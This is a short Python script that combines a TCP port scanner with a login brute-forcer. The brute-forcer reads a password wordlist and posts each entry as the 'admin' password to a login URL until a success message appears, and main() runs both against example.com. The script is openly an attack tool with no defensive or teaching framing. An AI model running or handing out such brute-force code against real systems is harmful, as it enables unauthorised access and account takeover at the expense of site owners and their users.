import socket
import requests

# Port Scanner Module
def port_scanner(target, ports):
    for port in ports:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        result = s.connect_ex((target, port))
        if result == 0:
            print(f"Port {port} is open on {target}")
        else:
            print(f"Port {port} is closed on {target}")
        s.close()

# Brute-Force Module
def brute_force_login(url, wordlist, username_field, password_field):
    with open(wordlist, 'r') as f:
        passwords = f.read().splitlines()

    for password in passwords:
        payload = {username_field: 'admin', password_field: password}
        response = requests.post(url, data=payload)
        if "Login successful" in response.text:
            print(f"Password found: {password}")
            return
        else:
            print(f"Attempt with password {password} failed.")

    print("Brute-force attack completed. No valid password found.")

def main():
    target = 'example.com'
    ports = [21, 22, 80, 443]
    wordlist = 'passwords.txt'
    login_url = 'http://example.com/login'
    username_field = 'username'
    password_field = 'password'

    print("Starting Port Scanner...")
    port_scanner(target, ports)
    
    print("\nStarting Brute-Force Attack...")
    brute_force_login(login_url, wordlist, username_field, password_field)

if __name__ == "__main__":
    main()
